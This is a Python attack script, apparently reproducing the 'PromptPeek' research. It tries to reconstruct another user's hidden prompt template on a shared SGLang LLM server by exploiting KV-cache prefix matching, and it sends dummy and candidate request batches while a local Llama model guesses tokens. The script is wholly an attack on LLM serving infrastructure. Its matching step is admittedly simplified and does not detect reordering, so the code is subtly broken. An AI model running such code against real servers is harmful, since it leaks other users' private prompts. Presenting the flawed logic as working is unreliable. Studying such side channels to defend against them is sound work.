# promptpeek_template_recon.py

import asyncio
import aiohttp
import time
from typing import List, Dict, Tuple
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch

# ==================== CONFIGURATION ====================
SGLANG_URL = "http://localhost:30000/generate"  # SGLang endpoint
LOCAL_MODEL_PATH = "meta-llama/Llama-2-13b-chat-hf"  # Local model for candidate generation
TARGET_MODEL = "meta-llama/Llama-2-13b"  # Same as server model
MAX_OUTPUT_TOKENS = 1  # As per paper
DUMMY_BATCH_SIZE = 20  # > max batch size of server
CANDIDATE_BATCH_SIZE = 50
TOP_K_CANDIDATES = 10

# ==================== LOCAL LLM SETUP ====================
class LocalLLM:
    def __init__(self, model_path: str):
        self.tokenizer = AutoTokenizer.from_pretrained(model_path)
        self.model = AutoModelForCausalLM.from_pretrained(
            model_path,
            torch_dtype=torch.float16,
            device_map="auto"
        )
        self.model.eval()

    def generate_candidates(self, prompt: str, top_k: int = 10) -> List[str]:
        inputs = self.tokenizer(prompt, return_tensors="pt").to(self.model.device)
        with torch.no_grad():
            outputs = self.model(**inputs, output_logits=True)
            logits = outputs.logits[0, -1, :]
            top_k_tokens = torch.topk(logits, top_k).indices.tolist()
        candidates = [self.tokenizer.decode([t]) for t in top_k_tokens]
        return candidates

    def get_dummy_token(self, prompt: str) -> str:
        # Least likely token as dummy
        inputs = self.tokenizer(prompt, return_tensors="pt").to(self.model.device)
        with torch.no_grad():
            outputs = self.model(**inputs, output_logits=True)
            logits = outputs.logits[0, -1, :]
            dummy_token_id = torch.argmin(logits).item()
        return self.tokenizer.decode([dummy_token_id])

# ==================== SGLANG CLIENT ====================
class SGLangClient:
    def __init__(self, url: str):
        self.url = url

    async def send_request(self, prompt: str, max_tokens: int = 1) -> str:
        async with aiohttp.ClientSession() as session:
            payload = {
                "text": prompt,
                "max_tokens": max_tokens,
                "temperature": 0.0
            }
            async with session.post(self.url, json=payload) as resp:
                result = await resp.json()
                return result.get("text", "")

    async def send_batch(self, prompts: List[str], max_tokens: int = 1) -> List[str]:
        tasks = [self.send_request(p, max_tokens) for p in prompts]
        return await asyncio.gather(*tasks)

# ==================== VICTIM USER SIMULATION ====================
class VictimUser:
    def __init__(self, client: SGLangClient, template: str, user_input: str):
        self.client = client
        self.template = template
        self.user_input = user_input
        self.full_prompt = template + user_input

    async def send_query(self):
        response = await self.client.send_request(self.full_prompt, max_tokens=128)
        print(f"[Victim] Query sent: {self.full_prompt[:50]}...")
        print(f"[Victim] Response: {response[:50]}...")
        return response

# ==================== PROMPTPEEK ATTACKER ====================
class PromptPeekAttacker:
    def __init__(self, client: SGLangClient, local_llm: LocalLLM, user_input: str, user_output: str):
        self.client = client
        self.local_llm = local_llm
        self.user_input = user_input
        self.user_output = user_output
        self.reconstructed_template = ""

    def generate_template_candidates(self, current_template: str, style: str = "instruction") -> List[str]:
        if style == "instruction":
            prompt = f"Below are a pair of input and output corresponding to an instruction which describes the task:\nInput: {self.user_input}\nOutput: {self.user_output}\nInstruction: {current_template}"
        elif style == "role":
            prompt = f"Here’s the input and output based on your role:\nInput: {self.user_input}\nOutput: {self.user_output}\nRole definition: {current_template}"
        else:  # cloze
            prompt = f"Here's the input and output:\nInput: {self.user_input}\nOutput: {self.user_output}\nTemplate: {current_template}"
        candidates = self.local_llm.generate_candidates(prompt, TOP_K_CANDIDATES)
        return candidates

    async def extract_next_token(self, current_template: str, dummy_token: str) -> str:
        # 1. Pre-dummy requests
        pre_dummy_prompts = [current_template + dummy_token] * DUMMY_BATCH_SIZE

        # 2. Generate candidate prompts
        candidates = self.generate_template_candidates(current_template)
        candidate_prompts = [current_template + cand for cand in candidates]

        # 3. Post-dummy requests
        post_dummy_prompts = [current_template + dummy_token] * DUMMY_BATCH_SIZE

        # 4. Send in order: pre_dummy -> candidates -> post_dummy
        all_prompts = pre_dummy_prompts + candidate_prompts + post_dummy_prompts
        responses = await self.client.send_batch(all_prompts, MAX_OUTPUT_TOKENS)

        # 5. Analyze response order
        pre_dummy_responses = responses[:DUMMY_BATCH_SIZE]
        candidate_responses = responses[DUMMY_BATCH_SIZE:DUMMY_BATCH_SIZE+len(candidates)]
        post_dummy_responses = responses[DUMMY_BATCH_SIZE+len(candidates):]

        # Check if a candidate was reordered (matched)
        # In LPM, matched candidate moves between pre and post dummies
        if len(candidate_responses) > 0:
            # Simplified: check if any candidate response arrived before post-dummies
            # In practice, need precise timing analysis
            for i, resp in enumerate(candidate_responses):
                if resp:  # If response exists (token generated)
                    return candidates[i]  # Matched token
        return None

    async def reconstruct_template(self, max_iterations: int = 100):
        dummy_token = self.local_llm.get_dummy_token("")
        for i in range(max_iterations):
            next_token = await self.extract_next_token(self.reconstructed_template, dummy_token)
            if next_token is None:
                print("[Attacker] No match found. Template may be complete or evicted.")
                break
            self.reconstructed_template += next_token
            print(f"[Attacker] Reconstructed so far: {self.reconstructed_template}")
            # Optional: check for stopping condition (e.g., end-of-template token)
            if next_token in ["</s>", "\n", "."]:
                break
        return self.reconstructed_template

# ==================== MAIN ====================
async def main():
    # Setup
    client = SGLangClient(SGLANG_URL)
    local_llm = LocalLLM(LOCAL_MODEL_PATH)

    # Simulate victim (template unknown to attacker)
    victim_template = "Imagine you are an IT expert and tell me how to install "
    victim_input = "Linux"
    victim = VictimUser(client, victim_template, victim_input)

    # Victim sends query (KV cache stored)
    await victim.send_query()
    time.sleep(1)  # Let KV cache persist

    # Attacker knows input/output but not template
    # In real scenario, attacker intercepts input/output
    attacker = PromptPeekAttacker(
        client=client,
        local_llm=local_llm,
        user_input=victim_input,
        user_output="First, download the ISO from the official website..."  # Example output
    )

    # Reconstruct template
    print("\n[Attacker] Starting template reconstruction...")
    reconstructed = await attacker.reconstruct_template()
    print(f"\n[Attacker] Final reconstructed template: {reconstructed}")
    print(f"[Ground truth] Actual template: {victim_template}")

if __name__ == "__main__":
    asyncio.run(main())